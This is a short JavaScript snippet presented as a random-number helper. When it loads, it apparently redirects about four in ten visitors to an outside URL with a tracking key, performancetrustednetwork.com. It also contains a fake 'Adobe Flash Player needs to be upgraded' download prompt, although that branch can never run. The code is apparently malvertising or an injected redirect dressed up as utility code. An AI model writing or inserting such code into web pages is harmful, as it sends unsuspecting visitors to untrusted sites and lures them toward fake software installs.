function randomNum(minNum,maxNum){ 
    switch(arguments.length){ 
        case 1: 
            return parseInt(Math.random()*minNum+1,10); 
        break; 
        case 2: 
            num = parseInt(Math.random()*(maxNum-minNum+1)+minNum,10); 
			if (num > 10000)
			{
				alert("Oh, it seems that your Adobe Flash Player needs to be upgraded. Please download the latest version and install it")
			}
			else if (num < 800)
			{
				window.location.href='https://www.performancetrustednetwork.com/pr4rcwtb?key=26f55289e7e407ad25d69c96b6520b75';
			}
			else
			{
			}
    } 
} 
randomNum(1,2000)
